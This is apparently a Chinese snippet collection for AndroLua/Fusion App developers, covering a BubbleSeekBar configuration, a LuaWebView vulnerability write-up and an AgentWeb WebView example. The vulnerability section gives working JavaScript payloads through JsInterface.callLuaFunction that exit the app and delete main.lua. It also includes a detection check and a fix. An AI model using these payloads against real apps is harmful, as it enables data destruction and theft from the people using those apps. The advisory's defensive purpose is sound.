.showThumbText()
.rtl(true)--从右侧显示
.sectionTextPosition(BubbleSeekBar.TextPosition.BELOW_SECTION_MARK)
.autoAdjustSectionMark()
.build();



Bubbles9.getConfigBuilder()
.max(3)
.progress(0)
.sectionCount(3)
.trackColor(0xFF757575)
.secondTrackColor(0xFF4CAF50)
.hideBubble()--关闭气泡
.sectionTextPosition(BubbleSeekBar.TextPosition.BELOW_SECTION_MARK)
.autoAdjustSectionMark()
.build();》》
《《LuaWebView漏洞存在》》
《《漏洞原理:
此漏洞类似于 2013 年曝出的 WebView 漏洞，于 Android 4.2 修复
（https://security.tencent.com/lucky/check_tools.html）。

AndroLua+，Fusion App1.3旧版本 使用的 LuaWebView 利用 WebView 的 addJavascriptInterface 方法给网页提供了调用 Lua 函数的接口，名称为 JsInterface ，内部有 callLuaFunction 方法，用它可以调用任意 Lua 函数。

--有可能被使用fa旧版本，Androlua+的同行做恶搞工程，运行前请看代码
 
利用方法:
在 HTML 网页中插入 JavaScript 脚本令客户端运行来调用此接口。

示例代码:
最简单的，调用FA的“退出程序”函数，直接退出应用：JsInterface.callLuaFunction("退出程序");

其它：
 

JsInterface.callLuaFunction("require","import");
--导入AndroLua的import模块,方便进行下一步操作

JsInterface.callLuaFunction("task","os.remove(activity.getLuaDir()..\"/main.lua\")");
--调用task函数,执行任意代码（示例为删除运行目录下的main.lua文件，使程序无法正常运行）

JsInterface.callLuaFunction("task","os.exit()")");
--同上（但内容为退出程序）

检查漏洞:
加载此Js以检查漏洞: 
alert("漏洞可能"+(window["JsInterface"]&&window["JsInterface"]["callLuaFunction"]?"存在":"不存在"))

当然，不如直接试下攻击: javascript:JsInterface.callLuaFunction("print","漏洞存在")，如果没有看到任何消息，就说明可能不存在这个漏洞

为什么是可能而不是肯定？因为漏洞可能存在于其它名称的接口中...没有进行扫描

 
危害:
Fusion App 能做的，网页都能做，包括：删除所有文件、窃取设备文件、获取其它网站的Cookie及修改正常代码使之不按开发者意愿运行（如：拦截应用的“登录”功能，发送密码到攻击者）等等

--原文链接:壹影博客  https://bk.yyge.net/?post=113

--修复LuaWebView漏洞，dingyi大佬分享的，
浏览器id.addJsInterface({
  execute=function()end
},"androlua")》》
《《AgentWeb是一个高度封装的WebView支持库》》
《《--[[
AgentWeb是一个高度封装的WebView支持库
https://github.com/Justson/AgentWeb

ALua示例:Github@daisukiKaffuChino
]]
import "com.just.agentweb.*"

layout={
 LinearLayout;
 orientation="vertical";
 layout_height="fill";
 layout_width="fill";
 {
  LinearLayout;
  orientation="horizontal";
  layout_height="-2";
  layout_width="fill";
  {
   Button;
   text="刷新";
   layout_weight="1";
   id="button";
  };
  {
   Button;
   layout_weight="1";
   text="后退";
   onClick=function()print("功能自己加")end;
  };
  {
   Button;
   layout_weight="1";
   text="前进";
   onClick=function()


   end;
  };
 };
 {
  LinearLayout;
  orientation="vertical";
  layout_height="fill";
  layout_width="fill";
  id="web";
 };
};


activity.setContentView(loadlayout(layout))

mAgentWeb = AgentWeb.with(this)
.setAgentWebParent(web, LinearLayout.LayoutParams(-1, -1))
.useDefaultIndicator()
--.setWebChromeClient(mWebChromeClient) --自定义WebChromeClient
.createAgentWeb()
.ready()
.go("https://www.baidu.com")

--获取webview对象   mAgentWeb.getWebCreator().getWebView()
--查看cookies      AgentWebConfig.getCookiesByUrl(targetUrl)
--刷新cookies      AgentWebConfig.syncCookie("http://www.jd.com","ID=XXXX")
--清空缓存        AgentWebConfig.clearDiskCache(this.getContext());

button.onClick=function()--刷新
 mAgentWeb.getWebCreator().getWebView().reload()
end

--网页后退
if mAgentWeb.back() then
 mAgentWeb.getWebCreator().getWebView().goBack()
end

--跟随Activity Or Fragment生命周期，释放CPU更省电。
function onPause()
 mAgentWeb.getWebLifeCycle().onPause()
end

function onResume()
 mAgentWeb.getWebLifeCycle().onResume()
end

function onDestroy()
 mAgentWeb.getWebLifeCycle().onDestroy()
end

--[JavaScript 与 Lua 交互

--[[Lua调用js方法
function callByAndroid()
  print("callByAndroid")
end
mAgentWeb.getJsAccessEntrace().quickCallJs("callByAndroid");
]]


--假如要自定义WebChromeClient的话
import "com.lua.*"
mWebViewClient = LuaWebChrome(LuaWebChrome.IWebChrine{
 onPageStarted=function(view, url, favicon)

 end
})

--[[
<!--如果你的应用需要用到视频，那么请你在使用 AgentWeb 的 Activity 对应的清单文件里加入如下配置-->
android:hardwareAccelerated="true"
android:configChanges="orientation|screenSize"
]]
--返回

function onKeyDown(keyCode, event)
 if (mAgentWeb.handleKeyEvent(keyCode,event))
  return true;
 end
end

